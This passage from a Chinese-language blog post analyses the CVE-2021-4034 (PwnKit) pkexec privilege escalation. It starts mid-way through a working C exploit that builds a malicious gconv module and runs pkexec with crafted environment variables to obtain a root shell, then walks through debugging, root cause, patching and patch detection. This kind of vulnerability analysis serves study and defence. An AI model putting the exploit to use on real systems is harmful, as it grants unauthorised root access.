fclose(f);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;gcc -o payload.so -shared -fPIC payload.c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *a_argv[]=&#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="keyword">char</span> *a_envp[]=&#123;</span><br><span class="line">        <span class="string">&quot;lol&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XAUTHORITY=../LOL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;GIO_USE_VFS=&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[~] compile helper..\n&quot;</span>);</span><br><span class="line">    compile_so();				<span class="comment">// 编译payload.c 为 payload.so</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">&quot;GCONV_PATH=.&quot;</span>, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">&quot;GCONV_PATH=.&quot;</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;GCONV_PATH=./lol&quot;</span>, O_CREAT|O_RDWR, <span class="number">0777</span>); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">&quot;lol&quot;</span>, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">&quot;lol&quot;</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        FILE *fp = fopen(<span class="string">&quot;lol/gconv-modules&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;module  UTF-8//    INTERNAL    ../payload    2\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[~] maybe get shell now?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, a_argv, a_envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该exp的流程大致为</p>
<ol>
<li>编译payload.c 为 payload.so。</li>
<li>创建目录 <code>GCONV_PATH=.</code> 并在该目录中创建文件 <code>lol</code>。</li>
<li>创建目录 <code>lol</code> 并在该目录中创建配置文件 <code>gconv-modules</code> ，之后在该文件中写入内容（该内容指定了生成的so文件）。</li>
<li>执行pkexec程序，不传入参数，传入<strong>一些特殊</strong>的环境变量。</li>
<li>反弹root shell</li>
</ol>
<p>我们先将该exp编译执行</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720113203384.png" alt="image-20220720113203384"></p>
<p>之后我们通过调试该exp来更加理解该漏洞的利用技巧。</p>
<p>首先610行读取argv[1]，实际上读取的是envp[0]。造成越界读取。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719165205934.png" alt="image-20220719165205934"></p>
<p>629行如果传入的命令不是绝对路径，那么将会在632行调用 <code>g_find_program_in_path</code> 函数在 PATH 环境变量的目录里搜索。632行这里由于我们指定了环境变量<code>PATH=GCONV_PATH=.</code>，所以path将会被赋值为 <code>GCONV_PATH=./lol</code>。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719165402306.png" alt="image-20220719165402306"></p>
<p>这里会有一个疑问，为什么要通过PATH环境变量传入 <code>GCONV_PATH=./lol</code>。直接在第一个环境变量传入 <code>GCONV_PATH=./lol</code>不是更方便吗，经过网上学习师傅的文章以及动手实践得到了一个结论：某些敏感的环境变量将会被清除。</p>
<p>下面的两步调试基于在第一个环境变量传入 <code>GCONV_PATH=./lol</code>的代码（错误的exp代码）。调试过程如下，在execve执行过程中，GCONV_PATH 还没有被清除</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720145728927.png" alt="image-20220720145728927"></p>
<p>但是到达pkexec.c的main函数时，GCONV_PATH 已经被清除了</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720145941472.png" alt="image-20220720145941472"></p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720150042034.png" alt="image-20220720150042034"></p>
<p>所以需要通过 <code>PATH环境变量</code>传入危险环境变量 <code>GCONV_PATH</code> 。</p>
<p>接下来回到正确的exp代码，639行 envp[0] 被赋值为<code>GCONV_PATH=./lol</code>。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719165628022.png" alt="image-20220719165628022"></p>
<p>670行后调用 validate_environment_variable 函数，此时的value 为 “en_US.UTF-8”</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719171539755.png" alt="image-20220719171539755"></p>
<p>这里可以拿到 GCONV_PATH 环境变量的值，也就是 gconv-modules 文件的路径。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719203655231.png" alt="image-20220719203655231"></p>
<p>iconv_open函数会读取环境变量中的GCONV_PATH的路径下的gconv-modules文件。如下，gconv_conf_filename 为静态常量，名称固定为”gconv-modules”。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719204534761.png" alt="image-20220719204534761"></p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719204608537.png" alt="image-20220719204608537"></p>
<p>之后读取文件内容。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719201933242.png" alt="image-20220719201933242"></p>
<p>获得module名称。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719202202612.png" alt="image-20220719202202612"></p>
<p>最后就是执行的过程了</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719210400585.png" alt="image-20220719210400585"></p>
<p>这里的step_cnt 为0， result[0]为payload.so，执行里面的gconv_init即执行了恶意代码。</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719211529231.png" alt="image-20220719211529231"></p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220719211556854.png" alt="image-20220719211556854"></p>
<h2 id="四、Summarize"><a href="#四、Summarize" class="headerlink" title="四、Summarize"></a>四、Summarize</h2><p>该漏洞的主要成因为：代码没有考虑argc为0的情况而使argv从1开始遍历，而下面也读写了argv[1]触发越界读写。</p>
<p>该漏洞的利用方式为：由于argv与env内存相邻且argv[1]越界读写，可知argv[lartest]（这个漏洞为argv[1]）与env[0]为同一块内存。通过<code>PATH</code>指定了危险环境变量<code>GCONV_PATH</code>，再通过后面的代码逻辑将<code>GCONV_PATH</code>拼接到<code>env[0]</code>中从而绕过系统的危险环境变量清理过程。之后就是要利用<code>GCONV_PATH</code>这个环境变量，<code>GCONV_PATH</code>存放的是 <code>gconv-modules</code> 的路径，exp的思路是利用了<code>g_printerr</code>函数，通过一定的代码逻辑可以调用了 <code>iconv_open</code>，最终使用了<code>GCONV_PATH</code>目录下的 <code>gconv-modules</code> 指定的payload.so文件，完成代码执行。</p>
<p>该漏洞的修复也比较简单，取消pkexec的suid权限即可，或者更新补丁。</p>
<p>如何判断pkexec是否被修补了呢，可以通过IDA找到对应的位置，在pkexec的main函数</p>
<p>修补前</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720161816877.png" alt="image-20220720161816877"></p>
<p>修补后</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720162102360.png" alt="image-20220720162102360"></p>
<p>或者可以通过退出码辅助判断</p>
<p>修补前</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720162140636.png" alt="image-20220720162140636"></p>
<p>修补后</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720162213928.png" alt="image-20220720162213928"></p>
<p>可以看到修补后有退出码127，目的就是为了该漏洞做的判断</p>
<p><img src="/2022/07/20/CVE-2021-4034-pwnkit-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220720162254380.png" alt="image-20220720162254380"></p>
<p>在我们做实战攻防的过程中，如果不能判断机器是否能够用该漏洞提权，除了直接拿exp打，也可以通过逆向来判断。一是判断pkexec是否有suid，二是判断pkexec是否打了补丁。</p>
<h2 id="五、Reference-link"><a href="#五、Reference-link" class="headerlink" title="五、Reference link"></a>五、Reference link</h2><ol>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.freedesktop.org/software/polkit/docs/latest/polkit.8.html" >https://www.freedesktop.org/software/polkit/docs/latest/polkit.8.html<i class="fas fa-external-link-alt"></i></a>                        # polkit Official Manual</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://saucer-man.com/information_security/876.html" >https://saucer-man.com/information_security/876.html<i class="fas fa-external-link-alt"></i></a>                                                 # Vulnerability Analysis</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683" >https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683<i class="fas fa-external-link-alt"></i></a>    # Patch link</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" >https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt<i class="fas fa-external-link-alt"></i></a>                                     # Vulnerability details public</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Setuid" >https://en.wikipedia.org/wiki/Setuid<i class="fas fa-external-link-alt"></i></a>                                                                                 # suid wikipedia</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10870#toc-2" >https://xz.aliyun.com/t/10870#toc-2<i class="fas fa-external-link-alt"></i></a>                                                                                 # Vulnerability Analysis</li>
<li><a class="link"   target="_blank" rel="noopener" href="https://gitlab.freedesktop.org/polkit/polkit/" >https://gitlab.freedesktop.org/polkit/polkit/<i class="fas fa-external-link-alt"></i></a>                                                                    # polkit Source Code</li>
</ol>

        </div>

        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/linux/">#linux</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2022/07/22/CVE-2017-8570-office-Scriptletfile%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CVE-2017-8570 office Scriptletfile远程代码执行漏洞分析</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2022/06/16/AI%E5%9F%BA%E7%A1%80/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">AI基础</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;Comments</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'oP8c99sduOuJjyeVoKafuweh-gzGzoHsz',
                    appKey: 'TwXXvHbKxF0DVsXV22S2uRVG',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '欢迎大家吐槽~',
                    lang: 'en'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'fa1lr4in';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">fa1lr4in</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2021-4034-pwnkit-linux-local-privilege-escalation-vulnerability-analysis"><span class="nav-text">CVE-2021-4034 pwnkit linux local privilege escalation vulnerability analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81foreword"><span class="nav-text">一、foreword</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Pre-knowledge"><span class="nav-text">二、Pre-knowledge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-polkit"><span class="nav-text">2.1 polkit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-Polkit-source-installation"><span class="nav-text">2.2 Polkit source installation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-suid"><span class="nav-text">2.3 suid</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Vulnerability-Analysis"><span class="nav-text">三、Vulnerability Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Patch-Analysis"><span class="nav-text">3.1 Patch Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Root-Cause-Analysis"><span class="nav-text">3.2 Root Cause Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-Exploit"><span class="nav-text">3.3 Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Summarize"><span class="nav-text">四、Summarize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Reference-link"><span class="nav-text">五、Reference link</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>




<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
    
</div>



</body>
</html>
